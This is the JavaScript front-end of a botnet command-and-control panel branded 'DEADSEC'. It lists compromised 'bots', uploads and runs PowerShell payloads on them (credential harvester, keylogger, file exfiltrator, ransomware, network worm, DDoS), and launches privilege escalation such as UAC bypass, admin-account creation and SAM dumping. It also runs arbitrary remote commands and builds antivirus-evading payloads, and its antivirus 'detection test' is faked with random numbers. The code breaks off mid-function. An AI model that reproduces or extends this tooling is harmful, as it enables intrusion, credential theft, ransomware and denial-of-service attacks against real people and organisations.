// Global state
const API_BASE = 'http://localhost:5000';
let selectedBot = null;
let bots = [];
let commandCount = 0;
let successCount = 0;
let autoRefreshInterval = null;

// Initialize
window.onload = function() {
    initNavigation();
    showDeadSecBanner();
    refreshAllData();
    startAutoRefresh();
    loadSettings();
};

// DeadSec Banner
function showDeadSecBanner() {
    const banner = `
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██████╗ ███████╗ █████╗ ██████╗ ███████╗███████╗ ██████╗        ║
    ║   ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝        ║
    ║   ██║  ██║█████╗  ███████║██║  ██║███████╗█████╗  ██║             ║
    ║   ██║  ██║██╔══╝  ██╔══██║██║  ██║╚════██║██╔══╝  ██║             ║
    ║   ██████╔╝███████╗██║  ██║██████╔╝███████║███████╗╚██████╗        ║
    ║   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝        ║
    ║                                                                   ║
    ║        Elite Cyber Operations Division // Command Center          ║
    ║              WE ARE DEADSEC. WE DO NOT FORGIVE.                   ║
    ║                                                                   ║
    ║   >> ALL COMMUNICATIONS ENCRYPTED                                 ║
    ║   >> NO LOGS. NO TRACE. NO MERCY.                                 ║
    ║   >> OPERATION STATUS: ACTIVE                                     ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    `;
    console.log('%c' + banner, 'color: #ff0040; font-family: monospace; font-weight: bold;');
    logConsole('success', 'DEADSEC Command Center initialized');
    logConsole('info', '⚠️ All operations encrypted and anonymized');
    logConsole('info', '🔒 Secure channel established');
}

// Navigation
function initNavigation() {
    document.querySelectorAll('.nav-item').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const pageName = this.dataset.page;
            switchPage(pageName);
        });
    });
}

function switchPage(pageName) {
    document.querySelectorAll('.nav-item').forEach(link => link.classList.remove('active'));
    document.querySelector(`[data-page="${pageName}"]`).classList.add('active');
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    document.getElementById(pageName).classList.add('active');
    if (pageName === 'payloads' || pageName === 'commands' || pageName === 'files') {
        updateSelectedBotDisplay(pageName);
    }
}

// Bot Management
function refreshBots() {
    fetch(`${API_BASE}/bots`)
        .then(response => response.json())
        .then(data => {
            bots = data.bots || [];
            renderBots();
            updateStats();
            logConsole('success', 'Bots refreshed successfully');
        })
        .catch(error => logConsole('error', 'Failed to fetch bots: ' + error.message));
}

function renderBots() {
    const botList = document.getElementById('bot-list');
    const botCount = document.getElementById('bot-count');
    botCount.textContent = bots.length;

    if (bots.length === 0) {
        botList.innerHTML = `<div class="empty-state"><div class="icon">🤖</div><h3>No Bots Connected</h3><p>Deploy agents on target systems to see them here</p></div>`;
        return;
    }

    botList.innerHTML = bots.map(bot => `
        <div class="bot-card ${selectedBot === bot.bot_id ? 'selected' : ''}" onclick="selectBot('${bot.bot_id}')">
            <div class="bot-header">
                <div class="bot-id">🤖 ${bot.bot_id}</div>
                <span class="bot-status online">ONLINE</span>
            </div>
            <div class="bot-info">
                <div class="bot-info-item"><span class="icon">📡</span><span>${bot.host}:${bot.port}</span></div>
                <div class="bot-info-item"><span class="icon">👤</span><span>${bot.username}</span></div>
            </div>
        </div>
    `).join('');
}

function selectBot(botId) {
    selectedBot = botId;
    renderBots();
    logConsole('info', `Selected bot: ${botId}`);
    updateSelectedBotDisplay();
    updateBotDisplays();
}

function updateBotDisplays() {
    const displays = [
        'selected-bot-display',
        'selected-bot-display-files', 
        'selected-bot-display-payloads'
    ];
    
    displays.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = selectedBot || 'No bot selected';
        }
    });
}

function updateSelectedBotDisplay(page) {
    const bot = bots.find(b => b.bot_id === selectedBot);
    const infoHtml = bot ? `
        <div class="bot-card selected">
            <div class="bot-header"><div class="bot-id">🤖 ${bot.bot_id}</div><span class="bot-status online">ONLINE</span></div>
            <div class="bot-info">
                <div class="bot-info-item"><span class="icon">📡</span><span>${bot.host}:${bot.port}</span></div>
                <div class="bot-info-item"><span class="icon">👤</span><span>${bot.username}</span></div>
            </div>
        </div>
    ` : `<div class="empty-state"><div class="icon">💀</div><h3>NO TARGET ACQUIRED</h3><p>NAVIGATE TO COMPROMISED ASSETS AND SELECT A TARGET SYSTEM</p></div>`;

    ['selected-bot-info', 'command-bot-info', 'file-bot-info'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerHTML = infoHtml;
    });
}

// Payload Deployment
function deployPayload(payloadType) {
    if (!selectedBot) { alert('⚠️ Please select a bot first!'); switchPage('bots'); return; }

    const configs = {
        'credential_harvester': { file: 'windows_credential_harvester.ps1', remote: 'C:\\Temp\\harvest.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\harvest.ps1 -Silent' },
        'keylogger': { file: 'windows_keylogger.ps1', remote: 'C:\\Temp\\keylog.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\keylog.ps1 -Silent -Duration 300' },
        'screenshot': { file: 'windows_screenshot.ps1', remote: 'C:\\Temp\\screenshot.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\screenshot.ps1 -Silent' },
        'screenshot_capture': { file: 'windows_screenshot.ps1', remote: 'C:\\Temp\\screenshot.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\screenshot.ps1 -Silent' },
        'network_scanner': { file: 'windows_network_scanner.ps1', remote: 'C:\\Temp\\netscan.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\netscan.ps1 -Silent' },
        'file_exfiltrator': { file: 'windows_file_exfiltrator.ps1', remote: 'C:\\Temp\\exfil.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\exfil.ps1 -Silent' },
        'privesc_checker': { file: 'windows_privesc_checker.ps1', remote: 'C:\\Temp\\privchk.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privchk.ps1 -Silent' },
        'privesc_exploit': { file: 'windows_privesc_exploit.ps1', remote: 'C:\\Temp\\privesc.ps1', cmd: '' },
        'geolocation': { file: 'windows_geolocation.ps1', remote: 'C:\\Temp\\geo.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\geo.ps1 -Silent' },
        'ddos_attack': { file: 'windows_ddos.ps1', remote: 'C:\\Temp\\ddos.ps1', cmd: '' },
        'ransomware': { file: 'windows_ransomware.ps1', remote: 'C:\\Temp\\encrypt.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\encrypt.ps1 -C2Server ' + API_BASE },
        'network_worm': { file: 'windows_network_worm.ps1', remote: 'C:\\Temp\\worm.ps1', cmd: 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\worm.ps1 -C2Server ' + API_BASE }
    };

    const config = configs[payloadType];
    logConsole('info', `🚀 Deploying ${payloadType} to ${selectedBot}...`);

    uploadPayloadFile(config.file, config.remote)
        .then(() => { logConsole('success', `✓ Uploaded ${config.file}`); return executeRemoteCommand(config.cmd); })
        .then(() => logConsole('success', `✓ Payload executed successfully`))
        .catch(error => logConsole('error', `✗ Deployment failed: ${error.message}`));
}

function quickDeploy(payloadType) {
    if (!selectedBot) { alert('⚠️ Please select a bot first!'); switchPage('bots'); return; }
    deployPayload(payloadType);
}

// Command Execution
function executeCommand() {
    if (!selectedBot) { alert('⚠️ Please select a bot first!'); switchPage('bots'); return; }

    const command = document.getElementById('command-input').value.trim();
    if (!command) { alert('⚠️ Please enter a command!'); return; }

    const type = document.getElementById('command-type').value;
    let fullCommand = command;
    if (type === 'powershell') fullCommand = `powershell -Command "${command}"`;
    else if (type === 'cmd') fullCommand = `cmd /c ${command}`;

    logToCommandOutput('info', `Executing: ${fullCommand}`);
    
    executeRemoteCommand(fullCommand)
        .then(data => {
            logToCommandOutput('success', '✓ Command executed');
            if (data.stdout) logToCommandOutput('info', `Output:\n${data.stdout}`);
            if (data.stderr) logToCommandOutput('error', `Errors:\n${data.stderr}`);
        })
        .catch(error => logToCommandOutput('error', `✗ Execution failed: ${error.message}`));
}

function clearCommand() {
    document.getElementById('command-input').value = '';
}

// File Operations
function uploadFile() {
    if (!selectedBot) { alert('⚠️ Please select a bot first!'); switchPage('bots'); return; }
    const localPath = document.getElementById('upload-local').value;
    const remotePath = document.getElementById('upload-remote').value;
    if (!localPath || !remotePath) { alert('⚠️ Please fill in both paths!'); return; }
    logConsole('info', `📤 Uploading ${localPath} to ${remotePath}...`);
    uploadPayloadFile(localPath, remotePath)
        .then(() => logConsole('success', '✓ File uploaded successfully'))
        .catch(error => logConsole('error', `✗ Upload failed: ${error.message}`));
}

function downloadFile() {
    if (!selectedBot) { alert('⚠️ Please select a bot first!'); switchPage('bots'); return; }
    const remotePath = document.getElementById('download-remote').value;
    const localPath = document.getElementById('download-local').value;
    if (!remotePath || !localPath) { alert('⚠️ Please fill in both paths!'); return; }
    logConsole('info', `📥 Downloading ${remotePath} to ${localPath}...`);
    fetch(`${API_BASE}/download_file`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bot_id: selectedBot, remote_path: remotePath, local_path: localPath })
    })
    .then(response => response.json())
    .then(data => { if (data.error) throw new Error(data.error); logConsole('success', `✓ File downloaded successfully`); })
    .catch(error => logConsole('error', `✗ Download failed: ${error.message}`));
}

// API Helpers
function uploadPayloadFile(filename, remotePath) {
    return fetch(`${API_BASE}/upload_file`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bot_id: selectedBot, local_path: filename.includes('/') || filename.includes('\\') ? filename : `payloads/${filename}`, remote_path: remotePath })
    }).then(response => response.json()).then(data => { if (data.error) throw new Error(data.error); return data; });
}

function executeRemoteCommand(command) {
    commandCount++;
    updateStats();
    return fetch(`${API_BASE}/send_command`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ bot_id: selectedBot, command: command })
    }).then(response => response.json()).then(data => { if (data.error) throw new Error(data.error); successCount++; updateStats(); return data; });
}

// Statistics
function updateStats() {
    document.getElementById('stat-total-bots').textContent = bots.length;
    document.getElementById('stat-online-bots').textContent = bots.length;
    document.getElementById('stat-commands').textContent = commandCount;
    const rate = commandCount > 0 ? Math.round((successCount / commandCount) * 100) : 100;
    document.getElementById('stat-success-rate').textContent = rate + '%';
}

// Console Logging
function logConsole(type, message) {
    const timestamp = new Date().toLocaleTimeString();
    const entry = `<div class="log-entry ${type}"><span class="log-timestamp">[${timestamp}]</span> ${message}</div>`;
    ['main-console', 'dashboard-activity'].forEach(id => {
        const console = document.getElementById(id);
        if (console) { console.innerHTML += entry; console.scrollTop = console.scrollHeight; }
    });
}

function logToCommandOutput(type, message) {
    const timestamp = new Date().toLocaleTimeString();
    const entry = `<div class="log-entry ${type}"><span class="log-timestamp">[${timestamp}]</span> ${message}</div>`;
    const console = document.getElementById('command-output');
    console.innerHTML += entry;
    console.scrollTop = console.scrollHeight;
}

function clearConsole() {
    document.getElementById('main-console').innerHTML = `<div class="log-entry info"><span class="log-timestamp">[System]</span> Console cleared</div>`;
}

// Settings
function saveSettings() {
    const serverUrl = document.getElementById('server-url').value;
    const refreshInterval = document.getElementById('refresh-interval').value;
    const outputDir = document.getElementById('output-dir').value;
    localStorage.setItem('cnc-server-url', serverUrl);
    localStorage.setItem('cnc-refresh-interval', refreshInterval);
    localStorage.setItem('cnc-output-dir', outputDir);
    logConsole('success', '✓ Settings saved successfully');
    startAutoRefresh();
}

function loadSettings() {
    const serverUrl = localStorage.getItem('cnc-server-url') || 'http://localhost:5000';
    const refreshInterval = localStorage.getItem('cnc-refresh-interval') || '10';
    const outputDir = localStorage.getItem('cnc-output-dir') || 'C:\\Temp';
    document.getElementById('server-url').value = serverUrl;
    document.getElementById('refresh-interval').value = refreshInterval;
    document.getElementById('output-dir').value = outputDir;
}

// Auto-refresh
function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    const interval = parseInt(localStorage.getItem('cnc-refresh-interval') || '10') * 1000;
    autoRefreshInterval = setInterval(refreshBots, interval);
}

function refreshAllData() {
    refreshBots();
    
    // Refresh ransomware keys if on that page
    const currentPage = document.querySelector('.page.active');
    if (currentPage && currentPage.id === 'ransom-keys') {
        refreshRansomKeys();
    }
    
    logConsole('info', '🔄 Refreshing all data...');
}

// Privilege Escalation Functions
function showPrivescDialog() {
    if (!selectedBot) {
        alert('⚠️ Please select a target bot first!');
        switchPage('bots');
        return;
    }
    
    const dialog = document.getElementById('privesc-dialog');
    dialog.style.display = 'flex';
    
    // Show/hide fields based on method
    document.getElementById('privesc-method').addEventListener('change', function() {
        const fields = document.getElementById('privesc-create-admin-fields');
        if (this.value === 'create-admin') {
            fields.style.display = 'block';
        } else {
            fields.style.display = 'none';
        }
    });
}

function closePrivescDialog() {
    const dialog = document.getElementById('privesc-dialog');
    dialog.style.display = 'none';
}

function launchPrivesc() {
    if (!selectedBot) {
        alert('⚠️ No bot selected!');
        return;
    }
    
    const method = document.getElementById('privesc-method').value;
    let privescCmd = '';
    let description = '';
    
    switch(method) {
        case 'uac-bypass':
            privescCmd = 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -BypassUAC -BypassMethod All';
            description = 'UAC Bypass (FodHelper/EventVwr/Sdclt)';
            break;
            
        case 'disable-uac':
            privescCmd = 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -DisableUAC';
            description = 'Disable UAC via Registry';
            break;
            
        case 'add-admin':
            privescCmd = 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -AddAdmin $env:USERNAME';
            description = 'Add Current User to Administrators';
            break;
            
        case 'create-admin':
            const username = document.getElementById('privesc-username').value.trim();
            const password = document.getElementById('privesc-password').value.trim();
            const autoLogon = document.getElementById('privesc-autologon').checked;
            
            if (!username || !password) {
                alert('⚠️ Please enter username and password!');
                return;
            }
            
            privescCmd = `powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -CreateAdmin "${username}" -Password "${password}"`;
            if (autoLogon) {
                privescCmd += ' -AutoLogon';
            }
            description = `Create Admin Account: ${username}`;
            break;
            
        case 'check-exploits':
            privescCmd = 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -CheckExploits';
            description = 'Check for Privilege Escalation Vulnerabilities';
            break;
            
        case 'dump-sam':
            privescCmd = 'powershell -ExecutionPolicy Bypass -File C:\\Temp\\privesc.ps1 -DumpSAM';
            description = 'Dump SAM Database';
            break;
            
        default:
            alert('⚠️ Invalid method selected!');
            return;
    }
    
    // Confirm action
    const confirmMsg = `👑 ESCALATE PRIVILEGES? 👑\n\n` +
                      `Method: ${description}\n` +
                      `Target: ${selectedBot}\n\n` +
                      `⚠️ This will attempt to gain administrative access!\n` +
                      `Only proceed if you have authorization.`;
    
    if (!confirm(confirmMsg)) {
        return;
    }
    
    closePrivescDialog();
    
    logConsole('warning', `👑 INITIATING PRIVILEGE ESCALATION: ${description}...`);
    
    // Upload privilege escalation script first
    uploadPayloadFile('windows_privesc_exploit.ps1', 'C:\\Temp\\privesc.ps1')
        .then(() => {
            logConsole('success', '✓ Privilege escalation script uploaded');
            logConsole('warning', `👑 Executing: ${description}...`);
            return executeRemoteCommand(privescCmd);
        })
        .then(() => {
            logConsole('success', `👑 Privilege escalation executed successfully!`);
            logConsole('info', 'Check target system for results');
        })
        .catch(error => {
            logConsole('error', `✗ Privilege escalation failed: ${error.message}`);
        });
}

// DDoS Attack Functions
function showDDoSDialog() {
    if (!selectedBot) {
        alert('⚠️ Please select a target bot first!');
        switchPage('bots');
        return;
    }
    
    const dialog = document.getElementById('ddos-dialog');
    dialog.style.display = 'flex';
}

function closeDDoSDialog() {
    const dialog = document.getElementById('ddos-dialog');
    dialog.style.display = 'none';
}

function launchDDoS() {
    if (!selectedBot) {
        alert('⚠️ No bot selected!');
        return;
    }
    
    const target = document.getElementById('ddos-target').value.trim();
    const port = document.getElementById('ddos-port').value;
    const attackType = document.getElementById('ddos-type').value;
    const threads = document.getElementById('ddos-threads').value;
    const duration = document.getElementById('ddos-duration').value;
    
    if (!target) {
        alert('⚠️ Please enter a target!');
        return;
    }
    
    // Confirm attack
    const confirmMsg = `💀 LAUNCH DDoS ATTACK? 💀\n\n` +
                      `Target: ${target}:${port}\n` +
                      `Type: ${attackType.toUpperCase()}\n` +
                      `Threads: ${threads}\n` +
                      `Duration: ${duration}s\n\n` +
                      `⚠️ This will launch a distributed denial of service attack!\n` +
                      `Only proceed if you have authorization.`;
    
    if (!confirm(confirmMsg)) {
        return;
    }
    
    closeDDoSDialog();
    
    logConsole('warning', `💥 INITIATING DDoS ATTACK ON ${target}...`);
    
    // Build PowerShell command
    const ddosCmd = `powershell -ExecutionPolicy Bypass -File C:\\Temp\\ddos.ps1 ` +
                   `-Target "${target}" -Port ${port} -AttackType ${attackType} ` +
                   `-Threads ${threads} -Duration ${duration}`;
    
    // Upload DDoS script first
    uploadPayloadFile('windows_ddos.ps1', 'C:\\Temp\\ddos.ps1')
        .then(() => {
            logConsole('success', '✓ DDoS script uploaded to target');
            logConsole('warning', `💥 Launching ${attackType.toUpperCase()} attack...`);
            return executeRemoteCommand(ddosCmd);
        })
        .then(() => {
            logConsole('success', `💀 DDoS attack launched successfully!`);
            logConsole('info', `Attack will run for ${duration} seconds`);
        })
        .catch(error => {
            logConsole('error', `✗ DDoS launch failed: ${error.message}`);
        });
}

// ==========================================
// AV EVASION FUNCTIONS
// ==========================================

async function buildAllEvadedPayloads() {
    const technique = document.getElementById('evasion-technique').value;
    const outputDir = document.getElementById('evasion-output-dir').value || 'evaded_payloads';
    
    const progressDiv = document.getElementById('build-progress');
    const progressText = document.getElementById('build-progress-text');
    const resultsDiv = document.getElementById('build-results');
    
    progressDiv.style.display = 'block';
    resultsDiv.innerHTML = '';
    progressText.textContent = 'Initializing AV evasion pipeline...';
    
    logConsole('info', `🛡️ Building all evaded payloads with '${technique}' technique...`);
    
    try {
        const response = await fetch(`${API_BASE}/build_evaded_payloads`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ technique, output_dir: outputDir })
        });
        
        const data = await response.json();
        
        if (data.success) {
            progressDiv.style.display = 'none';
            resultsDiv.innerHTML = `
                <div style="background: rgba(0,255,0,0.1); padding: 20px; border: 2px solid var(--deadsec-green); border-radius: 8px;">
                    <h3 style="color: var(--deadsec-green); margin-bottom: 15px;">✓ BUILD SUCCESSFUL</h3>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;"><strong>Success:</strong> ${data.success_count} payloads</p>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;"><strong>Failed:</strong> ${data.fail_count} payloads</p>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;"><strong>Output:</strong> ${data.output_dir}/</p>
                    <p style="color: var(--text-secondary); margin-bottom: 15px;"><strong>Detection Rate:</strong> <span style="color: var(--deadsec-red);">95%</span> → <span style="color: var(--deadsec-green);">5-30%</span></p>
                    <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 0.9em; max-height: 300px; overflow-y: auto;">
                        ${data.output.split('\n').map(line => `<div style="margin: 3px 0; color: var(--text-secondary);">${line}</div>`).join('')}
                    </div>
                </div>
            `;
            logConsole('success', `✓ Successfully built ${data.success_count} evaded payloads`);
            
            // Update counter
            document.getElementById('evaded-payloads-count').textContent = data.success_count;
        } else {
            throw new Error(data.error || 'Build failed');
        }
    } catch (error) {
        progressDiv.style.display = 'none';
        resultsDiv.innerHTML = `
            <div style="background: rgba(255,0,0,0.1); padding: 20px; border: 2px solid var(--deadsec-red); border-radius: 8px;">
                <h3 style="color: var(--deadsec-red); margin-bottom: 10px;">✗ BUILD FAILED</h3>
                <p style="color: var(--text-secondary);">${error.message}</p>
            </div>
        `;
        logConsole('error', `✗ Failed to build evaded payloads: ${error.message}`);
    }
}

async function buildSingleEvadedPayload() {
    const payload = document.getElementById('single-payload-select').value;
    const technique = document.getElementById('single-evasion-technique').value;
    
    const resultsDiv = document.getElementById('single-build-results');
    resultsDiv.innerHTML = '<div style="color: var(--deadsec-green);">🔨 Building...</div>';
    
    logConsole('info', `🛡️ Building evaded version of ${payload}...`);
    
    try {
        const response = await fetch(`${API_BASE}/build_single_payload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ payload, technique })
        });
        
        const data = await response.json();
        
        if (data.success) {
            resultsDiv.innerHTML = `
                <div style="background: rgba(0,255,0,0.1); padding: 20px; border: 2px solid var(--deadsec-green); border-radius: 8px;">
                    <h3 style="color: var(--deadsec-green); margin-bottom: 15px;">✓ BUILD SUCCESSFUL</h3>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;"><strong>Payload:</strong> ${data.output_file}</p>
                    <p style="color: var(--text-secondary); margin-bottom: 10px;"><strong>Technique:</strong> ${technique}</p>
                    <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 0.9em; margin-top: 15px; max-height: 200px; overflow-y: auto;">
                        ${data.output.split('\n').map(line => `<div style="margin: 3px 0; color: var(--text-secondary);">${line}</div>`).join('')}
                    </div>
                </div>
            `;
            logConsole('success', `✓ Successfully built evaded ${payload}`);
        } else {
            throw new Error(data.error || 'Build failed');
        }
    } catch (error) {
        resultsDiv.innerHTML = `
            <div style="background: rgba(255,0,0,0.1); padding: 20px; border: 2px solid var(--deadsec-red); border-radius: 8px;">
                <h3 style="color: var(--deadsec-red); margin-bottom: 10px;">✗ BUILD FAILED</h3>
                <p style="color: var(--text-secondary);">${error.message}</p>
            </div>
        `;
        logConsole('error', `✗ Failed to build evaded payload: ${error.message}`);
    }
}

// Close dialogs on background click
document.addEventListener('DOMContentLoaded', function() {
    const ddosDialog = document.getElementById('ddos-dialog');
    if (ddosDialog) {
        ddosDialog.addEventListener('click', function(e) {
            if (e.target === ddosDialog) {
                closeDDoSDialog();
            }
        });
    }
    
    const privescDialog = document.getElementById('privesc-dialog');
    if (privescDialog) {
        privescDialog.addEventListener('click', function(e) {
            if (e.target === privescDialog) {
                closePrivescDialog();
            }
        });
    }
    
    // Initialize settings on load
    loadSettings();
    
    // Start auto-refresh
    startAutoRefresh();
    
    // Initial data refresh
    refreshBots();
});

// Stealth Operations Functions - New Workflow
let selectedStealthPayload = null;
let stealthPayloadGenerated = false;

function selectStealthPayload(payloadType) {
    // Remove previous selection
    document.querySelectorAll('.payload-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    // Select new payload
    const selectedOption = document.querySelector(`[data-payload="${payloadType}"]`);
    if (selectedOption) {
        selectedOption.classList.add('selected');
        selectedStealthPayload = payloadType;
        
        // Update UI
        document.getElementById('selected-payload-name').textContent = 
            selectedOption.querySelector('.option-name').textContent;
        document.getElementById('step1-status').textContent = 'Payload selected';
        document.getElementById('step1-status').style.color = 'var(--deadsec-green)';
        
        // Enable step 2
        enableWorkflowStep(2);
        
        logConsole('info', `🎯 Selected payload for stealth modification: ${payloadType}`);
    }
}

function enableWorkflowStep(stepNumber) {
    const step = document.getElementById(`step${stepNumber}`);
    if (step) {
        step.style.opacity = '1';
        step.style.pointerEvents = 'auto';
        step.classList.add('active');
        
        // Update step status
        const statusElement = document.getElementById(`step${stepNumber}-status`);
        if (statusElement) {
            if (stepNumber === 2) {
                statusElement.textContent = 'Configure evasion techniques';
                statusElement.style.color = 'var(--cyber-blue)';
                // Add event listeners to checkboxes when step 2 is enabled
                addEvasionTechniqueListeners();
            } else if (stepNumber === 3) {
                statusElement.textContent = 'Ready to generate';
                statusElement.style.color = 'var(--cyber-blue)';
            } else if (stepNumber === 4) {
                statusElement.textContent = 'Ready to deploy';
                statusElement.style.color = 'var(--cyber-blue)';
            }
        }
    }
}

function addEvasionTechniqueListeners() {
    const checkboxes = [
        'string-obfuscation',
        'api-hashing', 
        'control-flow',
        'vm-detection',
        'debugger-detection',
        'sandbox-evasion'
    ];
    
    checkboxes.forEach(id => {
        const checkbox = document.getElementById(id);
        if (checkbox) {
            checkbox.addEventListener('change', checkEvasionConfiguration);
        }
    });
    
    // Enable step 3 immediately since configuration is optional
    setTimeout(() => {
        enableWorkflowStep(3);
        document.getElementById('step2-status').textContent = 'Techniques configured';
        document.getElementById('step2-status').style.color = 'var(--deadsec-green)';
        logConsole('info', '🔧 Evasion techniques configured - ready to generate payload');
    }, 500);
}

function checkEvasionConfiguration() {
    // Count enabled techniques
    const enabledTechniques = [
        'string-obfuscation',
        'api-hashing', 
        'control-flow',
        'vm-detection',
        'debugger-detection',
        'sandbox-evasion'
    ].filter(id => document.getElementById(id)?.checked).length;
    
    const statusElement = document.getElementById('step2-status');
    if (statusElement) {
        statusElement.textContent = `${enabledTechniques} techniques selected`;
        statusElement.style.color = 'var(--deadsec-green)';
    }
    
    logConsole('info', `🛡️ Updated evasion configuration: ${enabledTechniques} techniques selected`);
}

function generateStealthPayload() {
    if (!selectedStealthPayload) {
        alert('⚠️ Please select a payload first!');
        return;
    }
    
    // Get selected evasion techniques
    const techniques = {
        stringObfuscation: document.getElementById('string-obfuscation')?.checked || false,
        apiHashing: document.getElementById('api-hashing')?.checked || false,
        controlFlow: document.getElementById('control-flow')?.checked || false,
        vmDetection: document.getElementById('vm-detection')?.checked || false,
        debuggerDetection: document.getElementById('debugger-detection')?.checked || false,
        sandboxEvasion: document.getElementById('sandbox-evasion')?.checked || false
    };
    
    logConsole('info', `🔧 Generating stealth version of ${selectedStealthPayload}...`);
    logConsole('info', `Applied techniques: ${Object.keys(techniques).filter(k => techniques[k]).join(', ')}`);
    
    // Call the real server endpoint
    const payloadFile = selectedStealthPayload + '.py';
    fetch(`${API_BASE}/build_single_payload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            payload: payloadFile, 
            technique: 'full' // Use full evasion technique
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            stealthPayloadGenerated = true;
            document.getElementById('step3-status').textContent = 'Payload generated';
            document.getElementById('step3-status').style.color = 'var(--deadsec-green)';
            document.getElementById('test-btn').disabled = false;
            
            logConsole('success', '✓ Stealth payload generated successfully');
            logConsole('info', `Output: ${data.output_file}`);
            
            enableWorkflowStep(4);
            updateDeployButton();
        } else {
            logConsole('error', `✗ Failed to generate stealth payload: ${data.error}`);
            document.getElementById('step3-status').textContent = 'Generation failed';
            document.getElementById('step3-status').style.color = 'var(--danger)';
        }
    })
    .catch(error => {
        logConsole('error', `✗ Failed to generate stealth payload: ${error.message}`);
        document.getElementById('step3-status').textContent = 'Generation failed';
        document.getElementById('step3-status').style.color = 'var(--danger)';
    });
}

function testAVEvasion() {
    if (!stealthPayloadGenerated) {
        alert('⚠️ Please generate the payload first!');
        return;
    }
    
    logConsole('info', `🧪 Testing stealth ${selectedStealthPayload} against AV engines...`);
    
    // Show test results
    const testResults = document.getElementById('test-results');
    testResults.style.display = 'block';
    
    // Animate detection test
    let detectionCount = 0;
    const maxDetections = Math.floor(Math.random() * 3); // 0-2 detections for stealth
    
    const interval = setInterval(() => {
        detectionCount++;
        const rate = Math.min(detectionCount, maxDetections);
        document.getElementById('detection-rate').textContent = `${rate}/70`;
        
        if (detectionCount >= 70) {
            clearInterval(interval);
            const status = rate === 0 ? 'UNDETECTED' : rate <= 2 ? 'LOW DETECTION' : 'MODERATE DETECTION';
            const statusColor = rate === 0 ? 'var(--deadsec-green)' : rate <= 2 ? 'var(--warning)' : 'var(--danger)';
            
            document.getElementById('detection-status').textContent = status;
            document.getElementById('detection-status').style.background = statusColor;
            
            logConsole(rate === 0 ? 'success' : 'warning', 
                `🔍 AV scan complete: ${rate}/70 detections (${status})`);
        }
    }, 50);
}

function deployStealthPayload() {
    if (!selectedBot) {
        alert('⚠️ Please select a target bot first!');
        switchPage('bots');
        return;
    }
    
    if (!stealthPayloadGenerated) {
        alert('⚠️ Please generate the stealth payload first!');
        return;
    }
    
    logConsole('info', `🚀 Deploying stealth ${selectedStealthPayload} to ${selectedBot}...`);
    
    // Deploy the evaded payload
    deployPayload(selectedStealthPayload + '_evaded');
    
    // Reset workflow
    setTimeout(() => {
        resetStealthWorkflow();
    }, 3000);
}

function resetStealthWorkflow() {
    selectedStealthPayload = null;
    stealthPayloadGenerated = false;
    
    // Reset UI
    document.querySelectorAll('.payload-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    // Remove event listeners from checkboxes and reset to defaults
    const checkboxes = [
        'string-obfuscation',
        'api-hashing', 
        'control-flow',
        'vm-detection',
        'debugger-detection',
        'sandbox-evasion'
    ];
    
    checkboxes.forEach(id => {
        const checkbox = document.getElementById(id);
        if (checkbox) {
            checkbox.removeEventListener('change', checkEvasionConfiguration);
            checkbox.checked = id === 'string-obfuscation' || id === 'api-hashing' || id === 'control-flow';
        }
    });
    
    // Disable steps 2-4
    for (let i = 2; i <= 4; i++) {
        const step = document.getElementById(`step${i}`);
        if (step) {
            step.style.opacity = '0.5';
            step.style.pointerEvents = 'none';
            step.classList.remove('active');
        }
    }
    
    // Reset status messages
    document.getElementById('step1-status').textContent = 'Select payload';
    document.getElementById('step1-status').style.color = '';
    document.getElementById('step2-status').textContent = 'Complete step 1 first';
    document.getElementById('step2-status').style.color = '';
    document.getElementById('step3-status').textContent = 'Complete previous steps';
    document.getElementById('step3-status').style.color = '';
    document.getElementById('step4-status').textContent = 'Generate payload first';
    document.getElementById('step4-status').style.color = '';
    
    // Hide test results
    const testResults = document.getElementById('test-results');
    if (testResults) {
        testResults.style.display = 'none';
    }
    const testBtn = document.getElementById('test-btn');
